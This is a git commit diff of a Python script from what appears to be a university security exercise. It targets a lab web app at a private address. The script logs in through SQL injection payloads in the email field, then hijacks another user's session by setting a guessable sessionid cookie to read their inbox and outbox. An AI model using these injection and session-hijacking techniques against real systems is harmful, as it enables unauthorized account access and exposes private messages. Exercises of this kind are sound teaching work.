e673a2496a525d4b64af12af2407dfa0e30e7b2f
sulzbach <lucas@sulzbach.org>
2019-11-02 14:43:19 +0100

    Update Exercise 2.2 from Sheet 1

--- sheet1/a2/2/improper_auth.py
+++ sheet1/a2/2/improper_auth.py
@@ -2,35 +2,35 @@ import requests
 
 url = "http://10.0.23.22/myspray/"
 
-# Hanni Ball's session:
-s0 = requests.Session()
-r0 = s0.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='Hanni' AND last_name='Ball'; #", "password":"a"})
+# Suppose Hanni Ball is the attacker.
+s_attacker = requests.Session()
+r_attacker = s_attacker.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='Hanni' AND last_name='Ball'; #", "password":"a"})
 
-# N. O'Brian's session:
-s1 = requests.Session()
-r1 = s1.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='N.' AND last_name='O''Brian'; #", "password":"a"})
+# Suppose N. O'Brian is the victim.
+s_victim = requests.Session()
+r_victim = s_victim.post(url, data={"email":"a' UNION SELECT * FROM community_member WHERE first_name='N.' AND last_name='O''Brian'; #", "password":"a"})
 
 # The server differentiates both sessions by setting the cookie 'sessionid'. This id can be easily found out by looking at the user profile's
 # URL. Hanni Ball's id is 92 ("profile92.html") and N. O'Brian's is 96 ("profile96.html").
 
-# Clear Hanni Ball's cookies.
-s0.cookies.clear()
+# Clear the attacker's cookies.
+s_attacker.cookies.clear()
 
-# Send a request from Hanni Ball's session, but setting the cookie as N. O'Brian's id. The server will display N. O'Brian's start page, and
-# Hanni Ball will be able to see the other user's "You have been sprayed by" list.
-r0 = s0.get(url + "start.html", cookies={"sessionid":"96"})
-
-# Print HTML response.
-print(r0.content)
-
-# Access N. O'Brian's inbox as Hanni Ball.
-r0 = s0.get(url + "inbox.html", cookies={"sessionid":"96"})
+# Send a request from the attacker's session, but setting the cookie as the victim's id. The server will display the victim's start page, and
+# the attacker will be able to see the other user's "You have been sprayed by" list.
+r_attacker = s_attacker.get(url + "start.html", cookies={"sessionid":"96"})
 
 # Print HTML response.
-print(r0.content)
+print(r_attacker.content)
 
-# Access N. O'Brian's outbox as Hanni Ball.
-r0 = s0.get(url + "outbox.html", cookies={"sessionid":"96"})
+# Access the victim's inbox as the attacker.
+r_attacker = s_attacker.get(url + "inbox.html", cookies={"sessionid":"96"})
 
 # Print HTML response.
-print(r0.content)
+print(r_attacker.content)
+
+# Access the victim's outbox as the attacker.
+r_attacker = s_attacker.get(url + "outbox.html", cookies={"sessionid":"96"})
+
+# Print HTML response.
+print(r_attacker.content)
